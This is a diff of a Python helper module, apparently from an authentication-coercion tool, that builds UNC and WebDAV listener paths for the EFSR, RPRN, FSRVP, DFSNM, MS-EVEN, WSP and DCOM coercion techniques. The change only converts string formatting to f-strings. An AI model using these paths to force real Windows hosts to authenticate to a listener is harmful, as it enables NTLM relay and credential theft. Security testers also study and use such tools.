@@ -3,6 +3,8 @@
 import random
 import string
 
+_NUL = "\x00"
+
 
 def _rnd(n=8):
     return "".join(random.choices(string.ascii_lowercase, k=n))
@@ -11,50 +13,50 @@ def _rnd(n=8):
 def efsr_path(listener, listener_port=445):
     """EFSR UNC path. WebDAV when port != 445."""
     if listener_port != 445:
-        return "\\\\%s@%d/%s\\share\\file.txt\x00" % (listener, listener_port, _rnd(3))
-    return "\\\\%s\\test\\Settings.ini\x00" % listener
+        return f"\\\\{listener}@{listener_port}/{_rnd(3)}\\share\\file.txt{_NUL}"
+    return f"\\\\{listener}\\test\\Settings.ini{_NUL}"
 
 
 def rprn_path(listener, listener_port=445):
     """RPRN listener path. WebDAV when port != 445."""
     if listener_port != 445:
-        return "\\\\%s@%d/%s\x00" % (listener, listener_port, _rnd(3))
-    return "\\\\%s\x00" % listener
+        return f"\\\\{listener}@{listener_port}/{_rnd(3)}{_NUL}"
+    return f"\\\\{listener}{_NUL}"
 
 
 def fsrvp_path(listener, listener_port=445):
     """FSRVP share path. WebDAV when port != 445."""
     if listener_port != 445:
-        return "\\\\%s@%d/%s\x00" % (listener, listener_port, _rnd(3))
-    return "\\\\%s\\test\x00" % listener
+        return f"\\\\{listener}@{listener_port}/{_rnd(3)}{_NUL}"
+    return f"\\\\{listener}\\test{_NUL}"
 
 
 def dfsnm_path(listener, listener_port=445):
     """DFSNM ServerName path. WebDAV when port != 445."""
     if listener_port != 445:
-        return "\\\\%s@%d/%s\\share\\file.txt\x00" % (listener, listener_port, _rnd(3))
-    return "\\\\%s\\%s\\file.txt\x00" % (listener, _rnd())
+        return f"\\\\{listener}@{listener_port}/{_rnd(3)}\\share\\file.txt{_NUL}"
+    return f"\\\\{listener}\\{_rnd()}\\file.txt{_NUL}"
 
 
 def dfsnm_dfs_path(listener, listener_port=445):
     """DFSNM pDfsPath for AddRootTarget/RemoveRootTarget."""
     if listener_port != 445:
-        return "\\\\%s@%d/%s\x00" % (listener, listener_port, _rnd(3))
-    return "\\\\%s\\a\x00" % listener
+        return f"\\\\{listener}@{listener_port}/{_rnd(3)}{_NUL}"
+    return f"\\\\{listener}\\a{_NUL}"
 
 
 def even_path(listener, listener_port=445):
     """MS-EVEN device path. SMB only — no WebDAV variant."""
-    return "\\??\\UNC\\%s\\%s\\aa\x00" % (listener, _rnd())
+    return f"\\??\\UNC\\{listener}\\{_rnd()}\\aa{_NUL}"
 
 
 def wsp_uri(listener):
     """WSP file:// URI. SMB only."""
-    return "file:////%s/share" % listener
+    return f"file:////{listener}/share"
 
 
 def dcom_unc(listener):
     """DCOM UNC path with random share/filename."""
     share = "".join(random.choices(string.ascii_letters, k=4))
     fname = "".join(random.choices(string.ascii_letters, k=4))
-    return "\\\\%s\\%s\\%s.txt" % (listener, share, fname)
+    return f"\\\\{listener}\\{share}\\{fname}.txt"
